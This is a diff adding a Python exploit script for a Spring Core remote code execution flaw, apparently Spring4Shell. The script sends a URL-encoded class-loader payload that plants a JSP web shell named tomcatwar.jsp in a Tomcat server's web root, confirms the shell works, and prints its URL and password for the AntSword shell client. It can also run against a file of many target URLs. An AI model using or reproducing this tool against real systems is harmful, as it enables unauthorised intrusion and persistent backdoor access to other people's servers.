@@ -1,0 +1,45 @@
+import requests
+import argparse
+from urllib.parse import urljoin
+
+def Exploit(url):
+    headers = {"suffix":"%>//",
+               "c3":"%><%",
+                "c1":"Runtime",
+                "c2":"<%!",
+                "DNT":"1",
+
+
+                "Content-Type":"application/x-www-form-urlencoded"
+
+    }
+    data = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20class%20INCREMENTAL%20extends%20ClassLoader%7BINCREMENTAL(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20identical(byte%5B%5D%20b)%7Breturn%20super.defineClass(b%2C%200%2C%20b.length)%3B%7D%7Dpublic%20byte%5B%5D%20boilerplate(String%20str)%20throws%20Exception%20%7BClass%20base64%3Bbyte%5B%5Dvalue%20%3D%20null%3Btry%20%7Bbase64%3DClass.forName(%22sun.misc.BASE64Decoder%22)%3BObject%20decoder%20%3D%20base64.newInstance()%3Bvalue%20%3D%20(byte%5B%5D)decoder.getClass().getMethod(%22decodeBuffer%22%2C%20new%20Class%5B%5D%20%7BString.class%20%7D).invoke(decoder%2C%20new%20Object%5B%5D%20%7B%20str%20%7D)%3B%7D%20catch%20(Exception%20e)%20%7Btry%20%7Bbase64%3DClass.forName(%22java.util.Base64%22)%3BObject%20decoder%20%3D%20base64.getMethod(%22getDecoder%22%2C%20null).invoke(base64%2C%20null)%3Bvalue%20%3D%20(byte%5B%5D)decoder.getClass().getMethod(%22decode%22%2C%20new%20Class%5B%5D%20%7BString.class%20%7D).invoke(decoder%2C%20new%20Object%5B%5D%20%7B%20str%20%7D)%3B%7D%20catch%20(Exception%20ee)%20%7B%7D%7Dreturn%20value%3B%7D%25%7Bc3%7DiString%20cls%20%3D%20request.getParameter(%22TT%22)%3Bif%20(cls%20!%3D%20null)%20%7Bnew%20INCREMENTAL(this.getClass().getClassLoader()).identical(boilerplate(cls)).newInstance().equals(new%20Object%5B%5D%7Brequest%2Cresponse%7D)%3B%7D%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+    try:
+
+        go = requests.post(url,headers=headers,data=data,timeout=15,allow_redirects=False, verify=False)
+        shellurl = urljoin(url, 'tomcatwar.jsp')
+        shellgo = requests.get(shellurl,timeout=15,allow_redirects=False, verify=False)
+        if shellgo.status_code == 200:
+            print(f"漏洞存在，请用中国蚁剑连接密码:TT\nURL:{shellurl}")
+    except Exception as e:
+        print(e)
+        pass
+
+
+
+
+def main():
+    parser = argparse.ArgumentParser(description='Srping-Core Rce.')
+    parser.add_argument('--file',help='url file',required=False)
+    parser.add_argument('--url',help='target url',required=False)
+    args = parser.parse_args()
+    if args.url:
+        Exploit(args.url)
+    if args.file:
+        with open (args.file) as f:
+            for i in f.readlines():
+                i = i.strip()
+                Exploit(i)
+
+if __name__ == '__main__':
+    main()
